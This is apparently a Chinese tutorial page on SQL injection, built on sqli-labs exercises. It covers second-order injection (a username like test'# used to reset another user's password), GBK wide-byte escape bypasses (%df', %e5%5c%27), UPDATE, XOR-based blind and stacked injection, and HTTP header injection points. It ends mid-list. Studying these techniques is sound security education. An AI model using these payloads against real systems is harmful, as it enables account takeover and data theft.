<p>以sqli-labs <code>Less-24</code>为例，查看注册用户代码<code>login_create.php</code></p>
<p>创建用户时，使用了<code>mysql_escape_string</code>来转义防止注入</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$username=  mysql_escape_string($_POST[&#x27;username&#x27;]) ;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$pass= mysql_escape_string($_POST[&#x27;password&#x27;]);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$re_pass= mysql_escape_string($_POST[&#x27;re_password&#x27;]);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;</span><br></span></code></pre></div></div>
<p>但这里有一个问题，转义后的内容，拼接成SQL语句后再执行写入到数据库中时，会去掉转义添加的<code>\</code>而恢复之前的内容，因为SQL语句在执行的时候认为那也是防止转义的，就像咱们写代码的时候<code>&quot;\&quot;\&#x27;&quot;</code>会输出<code>&quot;&#x27;</code>一个道理，所以会自动去掉，可以来试一下：</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">insert</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> users </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> password</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;test\&#x27;#&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;test\&#x27;#&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> username </span><span class="token operator" style="color:#393A34">like</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;test%&quot;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211222125431309" src="/assets/images/image-20211222125431309-9bc6287ecc87021ada64d99996d044cc.png" width="1554" height="446" class="img_ev3q"></p>
<p>也就是说这个地方虽然有<code>mysql_escape_string</code>不能直接注入，但是被污染的数据已经写入到数据库中了，如果有地方直接取出这个数据拼接到SQL语句中，就可能出现二次注入！</p>
<hr>
<p>注册功能已经分析完了，接下来就是登陆，查看<code>login.php</code>，可以看到如果登录成功，就把登陆的用户名给<code>SESSION</code>，如果我们的用户名带有注入payload，且后续有其他地方拼接了<code>$_SESSION[&quot;username&quot;]</code>，就会出现二次注入</p>
<p><img decoding="async" loading="lazy" alt="image-20211222130049278" src="/assets/images/image-20211222130049278-ab8860e9633dc70d90d3b7943a1a0cc7.png" width="1836" height="1272" class="img_ev3q"></p>
<p>继续向下，看看哪里会出现拼接，分析修改密码的代码<code>pass_change.php</code>，可以直观的看到从<code>SESSION</code>获取用户名，然后拼接到SQL语句中，也就是这里造成了二次注入！！！</p>
<p><img decoding="async" loading="lazy" alt="image-20211222130407276" src="/assets/images/image-20211222130407276-097272be4a49ee8f556faf4e100a17bf.png" width="2278" height="1088" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用过程">利用过程<a href="#利用过程" class="hash-link" aria-label="利用过程的直接链接" title="利用过程的直接链接">​</a></h3>
<p>上面整个流程分析完了，总结一下就是<strong>恶意的SQL注入payload被存储到了数据库中，然后后续操作过程中被直接拿出来拼接到其他SQL语句中，导致了二次注入</strong>。</p>
<p>在这个例子中，我们可以控制的地方就在于如下SQL语句中的<code>username</code></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">UPDATE</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">SET</span><span class="token plain"> PASSWORD</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;$pass&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;$username&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> password</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;$curr_pass&#x27;</span><br></span></code></pre></div></div>
<p>那我们只需要将<code>username</code>设置为一些比较明显效果的函数，比如<code>&#x27; and sleep(5)#</code> 就可以直观的看到较长的响应时间</p>
<p>在这里因为还有一些其他的限制，我们可以尝试注释掉后面对原密码的验证的语句达到修改其他用户密码的目的。</p>
<blockquote>
<p>实战中如果不是特别有把握尽量不要使用<code>update</code>注入，毕竟会对目标的数据进行修改</p>
</blockquote>
<ul>
<li>注册用户<code>test&#x27;#</code>并登陆，修改密码，这里可构成SQL语句如下</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">UPDATE</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">SET</span><span class="token plain"> PASSWORD</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;123123&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;test&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">#&#x27; and password=&#x27;111111&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211222131823317" src="/assets/images/image-20211222131823317-86afb429f7ff808b4884afca80ad05f7.png" width="1048" height="784" class="img_ev3q"></p>
<ul>
<li>执行后，test用户的密码被成功修改</li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20211222131858398" src="/assets/images/image-20211222131858398-9284b90ffb1f7ed217874f8dd18a4e68.png" width="1150" height="370" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="宽字节注入">宽字节注入<a href="#宽字节注入" class="hash-link" aria-label="宽字节注入的直接链接" title="宽字节注入的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="魔术引号">魔术引号<a href="#魔术引号" class="hash-link" aria-label="魔术引号的直接链接" title="魔术引号的直接链接">​</a></h3>
<p>了解宽字节注入前，先了解一个PHP的防御函数<code>magic_quotes_gpc(魔术引号开关)</code></p>
<p><code>magic_quotes_gpc</code>函数在php中的作用是判断解析用户提交的数据，如果<code>magic_quotes_gpc=On</code>，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符<code>\</code>，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p>
<p>在<code>magic_quotes_gpc=On</code>的情况下，<strong>如果输入的数据有单引号（<code>&#x27;</code>）、双引号（<code>&quot;</code>）、反斜线（<code>\</code>）与 <code>NUL</code>（<code>NULL</code>字符）等字符，都会被加上反斜线</strong>，这些转义是必须的，如果这个选项为off,那么我们就必须调用<code>addslashes</code>这个函数来为字符串增加转义.</p>
<p>我们知道单引号和双引号内的一切都是字符串，但如果要进行SQL注入，那么就必定要尝试闭合单双引号，只有闭合了我们的语句才会被当成代码执行；在<code>magic_quotes_gpc=On</code>的情况下，这个防御看似是安全的。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="编码字符集">编码字符集<a href="#编码字符集" class="hash-link" aria-label="编码字符集的直接链接" title="编码字符集的直接链接">​</a></h3>
<p>单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码。</p>
<p>多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</p>
<p>两位的多字节字符有一个前导字节和尾字节；在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。</p>
<p>UTF-8 编码：是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</p>
<p>常见的宽字节：GB2312、GBK、GB18030、BIG5、Shift_JIS</p>
<hr>
<p>这里重点说一下GBK，GBK全称《汉字内码扩展规范》，是一种多字符编码；它使用了双字节编码方案，因为双字节编码所以gbk编码汉字，占用2个字节。</p>
<p>如：你好 --&gt; <code>C4E3 BAC3</code>，经过URL编码后<code>%C4%E3%BA%C3</code>，可以看出来一个字是2个字节组成</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概述">概述<a href="#概述" class="hash-link" aria-label="概述的直接链接" title="概述的直接链接">​</a></h3>
<p>因为使用了GBK编码会认为两个字符是一个汉字，所以可以使用一些字符和转义过后多出来的<code>\</code>组合两个字符，数据库就会尝试将他们转换为一个汉字，也就使得数据库不识别字符，对单引号、双引号的转义失败，从而达到闭合语句的目的。</p>
<p>**形成过程：**当PHP连接MYSQL时，当设置<code>character_set_client = gbk</code>时会导致GBK编码转换的问题，当注入的参数里带有<code>%df(%bf)</code>时，在魔术引号开关或者<code>addslashes()</code>函数的作用下，会将<code>%df%27</code>转换为<code>%df%5c%27</code>，此时<code>%df%5c</code>在会解析成一个汉字，从而“吃掉”反斜杠，单引号因此逃逸出来闭合语句</p>
<p><strong>根本原因：</strong><code>character_set_client</code>（客户端字符集）和 <code>character_set_connection</code>（连接层的字符集）不同，或转换函数如<code>iconv</code>、<code>mb_convert_encoding</code>使用不当</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="流程分析">流程分析<a href="#流程分析" class="hash-link" aria-label="流程分析的直接链接" title="流程分析的直接链接">​</a></h3>
<p>此处以sqli-labs <code>Less-33</code> 为例，查看它的源码</p>
<p><img decoding="async" loading="lazy" alt="image-20211220200826001" src="/assets/images/image-20211220200826001-5caf26bd58aace4326e53f428857a123.png" width="1560" height="2026" class="img_ev3q"></p>
<p><code>addslashes</code>函数将会把接收到的id的字符进行转义处理。如：</p>
<ul>
<li>字符<code>&#x27;</code>、<code>&quot;</code>、<code>\</code>、NULL前边会被添加上一条反斜杠<code>\</code>作为转义字符</li>
<li>多个空格被过滤成一个空格</li>
</ul>
<p>正常情况下，我们输入<code>id=1&#x27;#</code>，经过<code>addslashes</code>转义后，会变成<code>1\&#x27;#</code>，构成的SQL语义大概如下：</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1\&#x27;#&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>看上去没问题，但是我们注意到它有一行设置了编码</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql_query</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;SET NAMES gbk&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/*</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">SET character_set_client =&#x27;gbk&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">SET character_set_results =&#x27;gbk&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">SET character_set_connection =&#x27;gbk&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">*/</span><br></span></code></pre></div></div>
<p>根据刚才的双字节知识，我们如果输入<code>id=1%df&#x27;#</code>，那么转义后，就变成了<code>1%df\&#x27;#</code>，而<code>%df\</code>会被尝试识别成一个汉字，因此<code>&#x27;</code>就被释放出来绕过了转义限制，构成的SQL语义大概如下：</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1�&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">#&#x27;;</span><br></span></code></pre></div></div>
<p>尝试判定一下，是不是对的，输入 <code>id=1%df&#x27; or 1 -- -</code>，可见成功出现了结果</p>
<p><img decoding="async" loading="lazy" alt="image-20211220202332851" src="/assets/images/image-20211220202332851-d5999ffe2a919eee2930d79474165d27.png" width="1528" height="428" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="注入语句">注入语句<a href="#注入语句" class="hash-link" aria-label="注入语句的直接链接" title="注入语句的直接链接">​</a></h3>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">%</span><span class="token plain">df</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">27</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">23</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 不一定非得%df，%99、%aa、%fe等都可以</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="扩展">扩展<a href="#扩展" class="hash-link" aria-label="扩展的直接链接" title="扩展的直接链接">​</a></h3>
<p>为了避免漏洞，网站一般会设置UTF-8编码，然后进行转义过滤。但是由于一些不经意的字符集转换，又会导致漏洞</p>
<p>使用<code>set name UTF-8</code>指定了utf-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用<code>iconv()</code>函数先转为UTF-8，然后再拼接SQL语句</p>
<p><strong>测试语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">?id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">%</span><span class="token plain">e5</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">5</span><span class="token plain">c</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">27</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">--+</span><br></span></code></pre></div></div>
<p><code>%e5%5c</code> 是gbk编码，转换为UTF-8编码是<code>%e9%8c%a6</code></p>
<p><code>%e5%5c%27</code>首先从gbk编码经过<code>addslashes</code>函数之后变成<code>%e5%5c%5c%5c%27</code>，再通过<code>iconv()</code>将其转换为UTF-8编码，<code>%e9%8c%a6%5c%5c%27</code> ，其中<code>%e9%8c%a6</code>是汉字，<code>%5c%5c%27</code>解码之后是<code>\\&#x27;</code>第一个<code>\</code>将第二个<code>\</code>转义，使得<code>%27单引号</code>逃逸，成功闭合语句</p>
<p><img decoding="async" loading="lazy" alt="image-20211220211133110" src="/assets/images/image-20211220211133110-762053c88bf00e7598416e8b81bc8378.png" width="1632" height="418" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="update注入">Update注入<a href="#update注入" class="hash-link" aria-label="Update注入的直接链接" title="Update注入的直接链接">​</a></h2>
<p>和其他注入一样，无非就是闭合语句，然后注入自己的恶意语句，达到自己想要的效果，比如修改密码、查询数据等等</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>提示</div><div class="admonitionContent_BuS1"><p>update注入一般给敏感数据如<code>database()</code>的值设置到可见变量中，然后直接查看</p></div></div>
<p>这里单独列出来说一个点，就是<code>update</code>注入点如何重复给字段赋值</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">-- 正常update,sqli处为注入点</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">update</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;sqli&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> age</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">111</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 重复给username赋值</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">update</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;sqli&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">username</span><span class="token operator" style="color:#393A34">=</span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> age</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">111</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220120162322001" src="/assets/images/image-20220120162322001-2307100d6867e74a78400e43a559b7dd.png" width="1426" height="588" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="false注入">False注入<a href="#false注入" class="hash-link" aria-label="False注入的直接链接" title="False注入的直接链接">​</a></h2>
<blockquote>
<p>算是盲注内的一种利用手法，不过感觉用到的情况很少很少很少，个人感觉主要用到<code>and/or</code>被过滤的情况，但还是简单说下吧</p>
</blockquote>
<p>Mysql也是隐式类型转换，和php一样，放个图就比较清晰了</p>
<p><img decoding="async" loading="lazy" alt="image-20220125092251686" src="/assets/images/image-20220125092251686-da76da50d7f57cbf1eec26952653ceb4.png" width="752" height="778" class="img_ev3q"></p>
<p>简单来说就是给字符串转换为数字的时候，会自动从前往后判断，如果最前面是数字，比如<code>1abc</code>最前面是1，那么就会转换成对应的数字，这个地方就是<code>1</code>，如果前面是字母，就会转换成0</p>
<p><img decoding="async" loading="lazy" alt="12abc3转换为12" src="/assets/images/image-20220125092452597-c2e4d5e85a55bb8104fea601e9919e6e.png" width="720" height="352" class="img_ev3q"></p>
<hr>
<p>利用上面那个特性，我们就可以构造一些相关的语句，来达到我们的目的</p>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>备注</div><div class="admonitionContent_BuS1"><p>运算符很多，都可以用，一般举例为了方便用异或^</p><p>异或：不同为1，相同为0</p><p>核心就是：</p><p><code>0^1=1</code></p><p><code>0^0=0</code></p></div></div>
<p>如下图，直接讲payload比较通俗易通（ ==&gt; 后表示得到的结果，前面是运算的表达式）</p>
<p>第一部分：</p>
<ul>
<li><code>mid(database(),1,1)=&#x27;t&#x27;</code> ==&gt; 1</li>
<li><code>&#x27;aaa&#x27;^(mid(database(),1,1)=&#x27;t&#x27;)</code> ==&gt; <code>&#x27;aaa&#x27;^1</code> ==&gt; <code>0^1</code> ==&gt; 1</li>
<li><code>&#x27;aaa&#x27;^(mid(database(),1,1)=&#x27;t&#x27;)=1</code> ==&gt; <code>1=1</code> ==&gt; 1</li>
</ul>
<p>第二部分：</p>
<ul>
<li><code>mid(database(),1,1)=&#x27;a&#x27;</code> ==&gt; 0</li>
<li><code>&#x27;aaa&#x27;^(mid(database(),1,1)=&#x27;a&#x27;)</code> ==&gt; <code>&#x27;aaa&#x27;^0</code> ==&gt; <code>0^0</code> ==&gt; 0</li>
<li><code>&#x27;aaa&#x27;^(mid(database(),1,1)=&#x27;a&#x27;)=1</code> ==&gt; <code>0=1</code> ==&gt; 0</li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20220125092916025" src="/assets/images/image-20220125092916025-9df9fa93cf88ea9550e5ac0db63f47ea.png" width="1148" height="1132" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="堆叠注入">堆叠注入<a href="#堆叠注入" class="hash-link" aria-label="堆叠注入的直接链接" title="堆叠注入的直接链接">​</a></h2>
<p>堆叠注入与受限于select语句的其他注入不同，堆叠注入可用于执行任意SQL语句。</p>
<p>简单的说，由于<code>分号;</code>为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如<code>RENAME</code>、<code>DROP</code>等。</p>
<p>**注意：**通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。因此读取数据时建议使用union联合注入，若无法使用联合注入，可考虑使用<code>RENAME</code>关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名 。</p>
<div class="language-ascii codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-ascii codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mysql&gt; select 1;select 2;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+---+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| 1 |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+---+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| 1 |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+---+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1 row in set (0.00 sec)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+---+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| 2 |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+---+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| 2 |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+---+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1 row in set (0.00 sec)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="http头部注入">HTTP头部注入<a href="#http头部注入" class="hash-link" aria-label="HTTP头部注入的直接链接" title="HTTP头部注入的直接链接">​</a></h2>
<p>其实这个不能单独分一类，因为和之前的注入是一模一样的，只是注入的点不在咱们经常关注的参数中，而在http头中，这里算是补充一下应用场景吧</p>
<ul>
<li>
<p>HTTP头注入是指从HTTP头中获取数据，而未对获取到的数据进行过滤就直接代入SQL语句中，从而产生注入。</p>
</li>
<li>
<p>HTTP头注入常常发生在程序采集用户信息的模块中</p>
</li>
</ul>
<blockquote>
<p>是否可能存在注入，只需要记住一句话：<strong>所有和数据库存在交互的地方，都可能存在SQL注入</strong></p>
</blockquote>
<ul>
<li>常见的HTTP头：</li>
</ul>
<table><thead><tr><th>Header</th><th>说明</th></tr></thead><tbody><tr><td>Accept</td><td>浏览器能够处理的内容类型</td></tr><tr><td>Accept-Charset</td><td>浏览器能够显示的字符集</td></tr><tr><td>Accept-Encoding</td><td>浏览器能处理的压缩编码</td></tr><tr><td>Accept-Language</td><td>浏览器当前设置的语言</td></tr><tr><td>Connection</td><td>浏览器与服务器之间的连接</td></tr><tr><td>cookie</td><td>当前页面设置的cookie</td></tr><tr><td>Host</td><td>发出请求的页面所在域</td></tr><tr><td>Referer</td><td>发出请求的页面URL</td></tr><tr><td>User-agent</td><td>浏览器用户代理字符串</td></tr><tr><td>Server</td><td>web服务器表明自己是什么软件及版本信息</td></tr></tbody></table>
<ul>
<li>常见的注入点：</li>
</ul>
